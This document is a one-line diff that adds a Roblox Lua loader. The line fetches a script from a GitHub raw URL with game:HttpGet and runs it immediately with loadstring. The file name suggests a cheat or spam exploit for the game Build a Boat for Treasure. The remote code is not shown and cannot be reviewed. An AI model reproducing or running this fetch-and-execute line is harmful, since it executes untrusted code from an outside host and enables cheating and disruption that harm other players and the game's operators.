@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/build-a-boat-for-treasure-spam2-nnvpzpybgc49wr.lua"))()
